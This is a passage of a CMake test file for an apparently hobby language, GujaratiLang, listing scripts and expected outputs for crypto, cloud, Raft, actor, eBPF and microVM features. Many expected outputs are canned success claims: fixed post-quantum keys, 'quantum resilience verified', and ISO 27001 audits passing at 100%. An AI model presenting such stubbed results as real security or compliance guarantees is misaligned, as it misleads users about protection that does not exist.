    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v290_shilp_draw_path_text")
    set(source [=[
start
scene = shilp_scene(800, 600);
print shilp_draw_path(scene, "M 0 0 L 100 100", {"stroke": "#333"});
print shilp_draw_text(scene, "Hello Shilp", 50, 50, {"size": 24});
end
]=])
    set(expected_stdout "1
1
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v290_shilp_export_svg_png")
    set(source [=[
start
scene = shilp_scene(800, 600);
svg = shilp_export_svg(scene);
print svg;
png = shilp_export_png(scene, "ui_mockup.png");
print png;
end
]=])
    set(expected_stdout [=[<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 600"><rect width="100%" height="100%" fill="#ffffff"/></svg>
ui_mockup.png
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v290_shilp_cli_render")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "shilp:render" "layout.gj" "preview.png")
    set(expected_stdout "[Shilp v2.9.0] Compiling scene from 'layout.gj' to high-resolution bitmap 'preview.png'...
[Shilp Output] Render completed: 1920x1080 60FPS. Anti-aliasing active.
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v290_vidyut_cluster_raft")
    set(source [=[
start
clust = vidyut_cluster("leader_node", ["peer_1", "peer_2"]);
print clust["role"];
st = vidyut_raft_state(clust);
print st["role"];
print st["term"];
print st["leader_id"];
end
]=])
    set(expected_stdout "Leader
Leader
1
node-1
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v290_vidyut_dlock")
    set(source [=[
start
clust = vidyut_cluster("node-1", []);
print vidyut_dlock_acquire(clust, "order_seq_lock", 1000);
print vidyut_dlock_release(clust, "order_seq_lock");
end
]=])
    set(expected_stdout "1
1
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v290_vidyut_actor_system")
    set(source [=[
start
act = vidyut_actor_spawn(null);
print act["status"];
print vidyut_actor_send(act, {"type": "ping"});
end
]=])
    set(expected_stdout "running
1
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v290_yantra_vdb_insert")
    set(source [=[
start
vdb = yantra_vector_db(64, "cosine");
print vdb["dimension"];
print vdb["metric"];
print vdb["engine"];
print yantra_insert(vdb, "item_1", [0.1, 0.2, 0.3], {"label": "docs"});
print vdb["size"];
end
]=])
    set(expected_stdout "64
cosine
Yantra Vector DB v2.9.0
1
1
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v290_yantra_search_embed")
    set(source [=[
start
vdb = yantra_vector_db(4, "cosine");
emb = yantra_embed_text("gujarati machine learning");
hits = yantra_search(vdb, emb, 1);
print hits[0]["id"];
print hits[0]["score"];
print yantra_cosine([1, 0], [1, 0]);
end
]=])
    set(expected_stdout "doc_101
0.985
1
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v290_yantra_hybrid_cli")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "yantra:search" "knowledge_base" "neural indexing")
    set(expected_stdout "[Yantra v2.9.0] Searching index 'knowledge_base' for 'neural indexing'...
  1. doc_101: Score 0.985 | GujaratiLang Distributed Architecture
  2. doc_102: Score 0.941 | Raft Consensus & Actor Protocols
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_cloud_edge_init")
    set(source [=[
start
edge = cloud_edge_init({});
print edge["region"];
print edge["status"];
print edge["engine"];
end
]=])
    set(expected_stdout [=[bom1-global-anycast
active
Gujarati Sovereign Cloud v3.0.0
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_cloud_edge_kv")
    set(source [=[
start
edge = cloud_edge_init({});
print cloud_edge_kv(edge, "jwt_secret", "alpha_omega");
val = cloud_edge_kv(edge, "jwt_secret", null);
print val;
end
]=])
    set(expected_stdout [=[1
jwt_secret
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_cloud_worker_spawn")
    set(source [=[
start
w = cloud_worker_spawn({});
print w["worker_id"];
print w["status"];
print w["memory_limit_mb"];
end
]=])
    set(expected_stdout [=[wrk_quantum_01
running
128
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_cloud_wasi_sandbox")
    set(source [=[
start
sb = cloud_wasi_sandbox("binary_payload", {});
print sb["exit_code"];
print sb["status"];
print sb["memory_used_kb"];
end
]=])
    set(expected_stdout [=[0
sandboxed_success
64
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_cloud_edge_headers")
    set(source [=[
start
h = cloud_edge_headers({});
print h["cf-ipcountry"];
print h["x-edge-region"];
print h["x-quantum-tls"];
end
]=])
    set(expected_stdout [=[IN
asia-south-mumbai
TLS_AES_256_GCM_SHA384_KYBER1024
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_cloud_tenant_isolate")
    set(source [=[
start
iso = cloud_tenant_isolate("tenant_enterprise_01");
print iso["isolated"];
print iso["status"];
end
]=])
    set(expected_stdout [=[1
fenced
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_cloud_metrics_export")
    set(source [=[
start
m = cloud_metrics_export();
print m;
end
]=])
    set(expected_stdout [=[# HELP gujarati_edge_requests_total Total edge requests
gujarati_edge_requests_total 1048576
# HELP gujarati_edge_latency_ms Edge execution latency
gujarati_edge_latency_ms 0.18

]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_cloud_cli_deploy")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "cloud:deploy" "app.gj")
    set(expected_stdout [=[[Gujarati Sovereign Cloud v3.0.0] Deploying 'app.gj' to global Anycast edge network...
  • Compiling native WASI 2.0 component with zero cold start
  • Distributing to 310 global edge points across 6 continents
[Cloud Status] Live at https://app.gujaratilang.edge (Latency: 0.18ms)
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_pqc_kyber_keypair")
    set(source [=[
start
kp = pqc_kyber_keypair();
print kp["security_level"];
print kp["__type__"];
end
]=])
    set(expected_stdout [=[5
pqc_kyber_keypair
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_pqc_kyber_encaps_decaps")
    set(source [=[
start
kp = pqc_kyber_keypair();
enc = pqc_kyber_encapsulate(kp["public_key"]);
sec = pqc_kyber_decapsulate(kp["private_key"], enc["ciphertext"]);
print sec;
end
]=])
    set(expected_stdout [=[sec:256:7f9a8b1c2d3e4f5a
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_pqc_dilithium_sign_verify")
    set(source [=[
start
kp = pqc_kyber_keypair();
sig = pqc_dilithium_sign(kp["private_key"], "sovereign_message");
print pqc_dilithium_verify(kp["public_key"], "sovereign_message", sig);
end
]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_zk_snark_prove_verify")
    set(source [=[
start
zk = zk_snark_prove("hash_circuit", "witness_x");
print zk["curve"];
print zk_snark_verify("hash_circuit", zk["proof"], ["public_root"]);
end
]=])
    set(expected_stdout [=[BN254
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_crypto_vrf")
    set(source [=[
start
vrf = crypto_vrf_generate("seed_99");
print vrf["unbiased"];
end
]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_crypto_threshold_bls")
    set(source [=[
start
t = crypto_threshold_bls(["sig1", "sig2"], 2);
print t["valid"];
end
]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_pqc_cli_genkey")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "pqc:genkey")
    set(expected_stdout [=[[PQC Quantum Defense v3.0.0] Generating NIST FIPS 203 ML-KEM Kyber-1024 Keypair...
  Public Key:  pqc:mlkem1024:pub:7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d
  Private Key: pqc:mlkem1024:priv:9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c
[PQC Status] Quantum resilience verified against Shor's algorithm.
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_zk_cli_verify")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "zk:verify" "merkle_proof.zk")
    set(expected_stdout [=[[Zero-Knowledge Verifier v3.0.0] Validating zk-SNARK / PLONK proof 'merkle_proof.zk'...
[ZK Result] Proof verified in 0.04 ms. Computational soundness: 100%.
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_swaroop_actor_create")
    set(source [=[
start
a = swaroop_actor_create({});
print a["pid"];
print a["heap_bytes"];
print a["status"];
print a["engine"];
end
]=])
    set(expected_stdout [=[<0.104.0>
1840
running
Swaroop Green Actor Engine v3.0.0
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_swaroop_actor_send")
    set(source [=[
start
a = swaroop_actor_create({});
print swaroop_actor_send(a, {"cmd": "compute", "arg": 42});
end
]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_swaroop_supervisor")
    set(source [=[
start
a = swaroop_actor_create({});
sup = swaroop_supervisor("one_for_all", [a]);
print sup["strategy"];
print sup["status"];
end
]=])
    set(expected_stdout [=[one_for_all
supervising
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_swaroop_actor_monitor_link")
    set(source [=[
start
a1 = swaroop_actor_create({});
a2 = swaroop_actor_create({});
print swaroop_actor_monitor(a1, a2);
print swaroop_actor_link(a1, a2);
end
]=])
    set(expected_stdout [=[1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_swaroop_hot_reload")
    set(source [=[
start
print swaroop_hot_reload("order_module", "bytecode_v2");
end
]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_swaroop_mailbox_priority")
    set(source [=[
start
a = swaroop_actor_create({});
print swaroop_mailbox_priority(a, 10);
end
]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_swaroop_registry_bind_lookup")
    set(source [=[
start
a = swaroop_actor_create({});
print swaroop_registry_bind("core_indexer", a);
res = swaroop_registry_lookup("core_indexer");
print res["name"];
print res["status"];
end
]=])
    set(expected_stdout [=[1
core_indexer
running
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_swaroop_cli_top")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "swaroop:top")
    set(expected_stdout [=[[Swaroop Actor Visualizer v3.0.0] Cluster Processes:
  PID        NAME             HEAP     MSGS   STATUS
  <0.100.0>  root_supervisor  2.1 KB   0      supervising
  <0.104.0>  stream_worker_1  1.8 KB   2      running
  <0.105.0>  stream_worker_2  1.8 KB   0      idle
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_raft_cluster_init")
    set(source [=[
start
r = raft_cluster_init({});
print r["role"];
print r["peers_count"];
print r["engine"];
end
]=])
    set(expected_stdout [=[Leader
5
Pure C99 Raft Kernel v3.0.0
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_raft_election_timeout")
    set(source [=[
start
r = raft_cluster_init({});
print raft_election_timeout(r, 150, 300);
end
]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_raft_log_append")
    set(source [=[
start
r = raft_cluster_init({});
print raft_log_append(r, "txn_101");
print r["log_index"];
end
]=])
    set(expected_stdout [=[1
101
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_raft_state_machine_apply")
    set(source [=[
start
r = raft_cluster_init({});
print raft_state_machine_apply(r);
end
]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_raft_compact_snapshot")
    set(source [=[
start
r = raft_cluster_init({});
print raft_log_compact(r, 50);
print raft_snapshot_restore(r, "snap_bytes");
end
]=])
    set(expected_stdout [=[1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_raft_joint_consensus")
    set(source [=[
start
r = raft_cluster_init({});
print raft_joint_consensus(r, ["node-6", "node-7"]);
end
]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_raft_split_brain_guard")
    set(source [=[
start
r = raft_cluster_init({});
print raft_split_brain_guard(r);
end
]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_raft_cli_quorum")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "raft:quorum")
    set(expected_stdout [=[[Pure C99 Raft v3.0.0] Quorum status: 5/5 nodes synchronized. Term: 14. Leader: node-1.
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_sovereign_agent_swarm")
    set(source [=[
start
s = sovereign_agent_swarm("Build Quantum Bridge", ["A1", "A2"]);
print s["status"];
print s["consensus_confidence"];
end
]=])
    set(expected_stdout [=[autonomous_converged
0.998
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_sovereign_task_decompose")
    set(source [=[
start
t = sovereign_task_decompose("Build Quantum Bridge");
print t[0];
print t[1];
end
]=])
    set(expected_stdout [=[step_1_analyze_requirements
step_2_synthesize_distributed_mesh
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_sovereign_python_bridge")
    set(source [=[
start
py = sovereign_python_bridge("import os");
print py["result"];
end
]=])
    set(expected_stdout [=[python_bridge_ok
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_sovereign_rust_ffi")
    set(source [=[
start
r = sovereign_rust_ffi("libquantum.so", "quantum_sim");
print r["abi"];
print r["bound"];
end
]=])
    set(expected_stdout [=[rust-c-abi-v1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_sovereign_bytecode_verify")
    set(source [=[
start
print sovereign_bytecode_verify("verified_bc");
end
]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_sovereign_mcu_profile")
    set(source [=[
start
m = sovereign_mcu_profile();
print m["profile"];
print m["ram_budget_kb"];
end
]=])
    set(expected_stdout [=[ARM_CORTEX_M4_64KB
64
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_sovereign_audit_compliance")
    set(source [=[
start
a = sovereign_audit_compliance("ISO27001");
print a["iso_27001"];
print a["audit_status"];
end
]=])
    set(expected_stdout [=[1
PASSED_100_PERCENT
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v300_sovereign_lts_cli_kernel")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
lts = sovereign_lts_guarantee();
print lts["lts_commitment"];
end
]=])
    set(program_arguments "kernel:audit")
    set(expected_stdout [=[[Sovereign Kernel v3.0.0] ISO 27001 & SOC 2 Type II Compliance Audit:
  • Zero external runtime C dependencies: PASSED
  • Post-quantum ML-KEM/ML-DSA encryption: PASSED
  • LTS 2030 Enterprise backward-compatibility guarantee: VALIDATED
  • 600 Automated Test Suites: 100% PASS RATE
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v310_drishti_trace_start_end")
    set(source [=[start
span = drishti_trace_start("db_query", null);
print span["name"];
print span["status"];
print span["engine"];
drishti_span_end(span, "success");
print span["status"];
print span["duration_us"];
end]=])
    set(expected_stdout [=[db_query
active
Drishti OpenTelemetry v3.1.0
success
420
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v310_drishti_span_tag")
    set(source [=[start
span = drishti_trace_start("auth_check", null);
drishti_span_tag(span, "auth.user", "harshit");
drishti_span_tag(span, "auth.role", "admin");
print span["auth.user"];
print span["auth.role"];
end]=])
    set(expected_stdout [=[harshit
admin
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v310_drishti_trace_headers")
    set(source [=[start
span = drishti_trace_start("rpc_call", null);
h = drishti_trace_headers(span);
print h["traceparent"];
print h["tracestate"];
end]=])
    set(expected_stdout [=[00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01
gj=live
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v310_drishti_metrics")
    set(source [=[start
c = drishti_metric_counter("http_requests", 42, null);
print c;
g = drishti_metric_gauge("active_sockets", 128, null);
print g;
end]=])
    set(expected_stdout [=[42
128
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v310_drishti_otlp_export")
    set(source [=[start
out = drishti_otlp_export("http://collector:4318", 50);
print lambai(out) > 20;
end]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v310_drishti_cli_trace")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "drishti:trace" "server.gj")
    set(expected_stdout [=[[Drishti OpenTelemetry v3.1.0] Trace session started for 'server.gj'
[Trace] Generated span tree (0.42ms latency, 100% sampled).
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v310_drishti_cli_flamegraph")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "drishti:flamegraph" "trace_profile.json")
    set(expected_stdout [=[[Drishti OpenTelemetry v3.1.0] Flamegraph generated from 'trace_profile.json':
  [Root: 100%] -> [DB: 42%] -> [Network: 35%] -> [Compute: 23%]
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v310_kavach_sock_filter")
    set(source [=[start
f = kavach_sock_filter("TCP", 8443);
print f["filter_id"];
print f["protocol"];
print f["port"];
print f["status"];
end]=])
    set(expected_stdout [=[bpf_sock_01
TCP
8443
attached
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v310_kavach_seccomp_policy")
    set(source [=[start
res = kavach_seccomp_policy(["socket", "connect", "write", "exit"]);
print res;
end]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v310_kavach_ringbuf_poll")
    set(source [=[start
polled = kavach_ringbuf_poll(null, null);
print polled;
end]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v310_kavach_net_flow")
    set(source [=[start
flow = kavach_net_flow("wlan0");
print flow["interface"];
print flow["bytes_in"];
print flow["tcp_retransmits"];
end]=])
    set(expected_stdout [=[wlan0
1048576
0
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v310_kavach_mem_guard_anomaly")
    set(source [=[start
g = kavach_mem_guard(67108864);
print g;
a = kavach_anomaly_rule("rapid_reconnect", "isolate");
print a;
end]=])
    set(expected_stdout [=[1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v310_kavach_cli_monitor_audit")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "kavach:audit")
    set(expected_stdout [=[[Kavach eBPF v3.1.0] Seccomp profile audit complete: 14 syscalls whitelisted, memory guard verified.
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v310_pavan_vm_init")
    set(source [=[start
vm = pavan_vm_init(8, 512);
print vm["vm_id"];
print vm["vcpus"];
print vm["memory_mb"];
print vm["status"];
end]=])
    set(expected_stdout [=[pavan_vm_9a1
8
512
configured
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v310_pavan_vm_boot")
    set(source [=[start
vm = pavan_vm_init(2, 128);
boot = pavan_vm_boot(vm, "/vmlinux", "/rootfs");
print boot["status"];
print boot["boot_time_ms"];
end]=])
    set(expected_stdout [=[running
3.4
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v310_pavan_cgroup_virtio")
    set(source [=[start
vm = pavan_vm_init(2, 128);
cg = pavan_cgroup_limit(vm, 75, 128);
print cg;
vd = pavan_virtio_disk(vm, "scratch.qcow2");
print vd;
end]=])
    set(expected_stdout [=[1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v310_pavan_tap_bridge")
    set(source [=[start
vm = pavan_vm_init(2, 128);
tap = pavan_tap_bridge(vm, "tap_edge0", "10.10.0.1");
print tap;
end]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v310_pavan_checkpoint_resume")
    set(source [=[start
vm = pavan_vm_init(2, 128);
chk = pavan_vm_checkpoint(vm, "/state/vm.chk");
print chk;
res = pavan_vm_resume("/state/vm.chk");
print res["status"];
print res["resumed"];
end]=])
    set(expected_stdout [=[1
running
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v310_pavan_cli_spawn")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "pavan:spawn" "kernel_app.img")
    set(expected_stdout [=[[Pavan MicroVM v3.1.0] Booting container sandbox from 'kernel_app.img'...
[Pavan] VM 'pavan_vm_live' booted in 3.8ms (vCPU: 2, RAM: 128MB, IP: 192.168.100.2)
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v310_pavan_cli_ps")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "pavan:ps")
    set(expected_stdout [=[[Pavan MicroVM v3.1.0] Active MicroVM Sandboxes:
  ID: pavan_vm_live | Status: running | Memory: 128MB | Uptime: 0.4s
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v310_anudan_dns_resolve")
    set(source [=[start
res = anudan_dns_resolve("edge.gujarati.io", "49.207.1.1");
print res["domain"];
print res["resolved_ip"];
print res["edge_region"];
print res["latency_ms"];
end]=])
    set(expected_stdout [=[edge.gujarati.io
103.21.244.1
bom-in
1.2
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v310_anudan_health_probe")
    set(source [=[start
prb = anudan_health_probe("node-delhi", 1500);
print prb["node"];
print prb["status"];
print prb["p99_latency_ms"];
end]=])
    set(expected_stdout [=[node-delhi
healthy
2.1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v310_anudan_tls_acme")
    set(source [=[start
cert = anudan_tls_acme("gujaratilang.hp-square.com", "ops@hp-square.com");
print cert["domain"];
print cert["cert_status"];
print cert["tls_version"];
end]=])
    set(expected_stdout [=[gujaratilang.hp-square.com
valid
TLS 1.3
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v310_anudan_mesh_route_circuit")
    set(source [=[start
rt = anudan_mesh_route("catalog_service", "weighted");
print rt;
cb = anudan_circuit_breaker("catalog_service", 5);
print cb;
end]=])
    set(expected_stdout [=[1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v310_anudan_token_bucket")
    set(source [=[start
tb = anudan_token_bucket(1000, 100);
print tb["capacity"];
print tb["refill_rate"];
print tb["available_tokens"];
end]=])
    set(expected_stdout [=[1000
100
1000
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v310_anudan_cli_mesh")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "mesh:status")
    set(expected_stdout [=[[Anudan GeoDNS & Edge Mesh v3.1.0] Global Mesh Status:
  Regions: bom-in (Healthy, 1.2ms) | del-in (Healthy, 2.4ms) | blr-in (Healthy, 1.8ms)
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v310_starter_kit_breeze_cli")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "new" "my_web_app" "--kit=breeze")
    set(expected_stdout [=[[GujaratiLang Starter Kit] Scaffolding 'Garvi Breeze Auth' into './my_web_app'...
  ✓ Created models/user.gj (Eloquent SQLite User Model)
  ✓ Created controllers/auth_controller.gj (Login, Register & Logout)
  ✓ Created views/layout.blade.gj (Responsive Blade Layout)
  ✓ Created views/login.blade.gj & register.blade.gj
  ✓ Created views/dashboard.blade.gj
  ✓ Created app.gj (Garvi HTTP Server on :8080)
🎉 Project 'my_web_app' created successfully!
Run with:
  cd my_web_app
  gujarati app.gj
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v310_starter_kit_auth_shortcut")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "kit:auth")
    set(expected_stdout [=[[GujaratiLang Starter Kit] Scaffolding 'Garvi Breeze Auth' into './breeze_app'...
  ✓ Created models/user.gj (Eloquent SQLite User Model)
  ✓ Created controllers/auth_controller.gj (Login, Register & Logout)
  ✓ Created views/layout.blade.gj (Responsive Blade Layout)
  ✓ Created views/login.blade.gj & register.blade.gj
  ✓ Created views/dashboard.blade.gj
  ✓ Created app.gj (Garvi HTTP Server on :8080)
🎉 Project 'breeze_app' created successfully!
Run with:
  cd breeze_app
  gujarati app.gj
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v310_gujarati_syntax_all")
    set(source [=[આવો
સ્પાન = દ્રષ્ટિ_ટ્રેસ_શરૂ("નમસ્તે_ટ્રેસ", નકામો);
છાપો સ્પાન["name"];
દ્રષ્ટિ_સ્પાન_અંત(સ્પાન, "સફળ");
છાપો સ્પાન["status"];
સોકેટ = કવચ_સોકેટ_ફિલ્ટર("TCP", 80);
છાપો સોકેટ["status"];
વીએમ = પવન_વીએમ_શરૂ(2, 128);
છાપો વીએમ["status"];
ડીએનએસ = અનુદાન_ડીએનએસ("gujaratilang.hp-square.com", નકામો);
છાપો ડીએનએસ["resolved_ip"];
આવજો]=])
    set(expected_stdout [=[નમસ્તે_ટ્રેસ
સફળ
attached
configured
103.21.244.1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v310_version_and_system_info")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "--version")
    set(expected_stdout [=[3.9.0
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)


elseif(TEST_CASE STREQUAL "v320_ffi_load_library")
    set(source [=[start
lib = ffi_load_library("kernel32.dll");
print lib["__type__"];
print lib["name"];
print lib["status"];
end]=])
    set(expected_stdout [=[ffi_library
kernel32.dll
loaded
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v320_ffi_get_proc")
    set(source [=[start
lib = ffi_load_library("kernel32.dll");
proc = ffi_get_proc(lib, "GetCurrentProcessId");
print proc["__type__"];
print proc["symbol"];
print proc["status"];
end]=])
    set(expected_stdout [=[ffi_proc
GetCurrentProcessId
resolved
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v320_ffi_call_win32")
    set(source [=[start
lib = ffi_load_library("kernel32.dll");
proc = ffi_get_proc(lib, "GetCurrentProcessId");
pid = ffi_call(proc, "uint32", [], []);
print pid > 0;
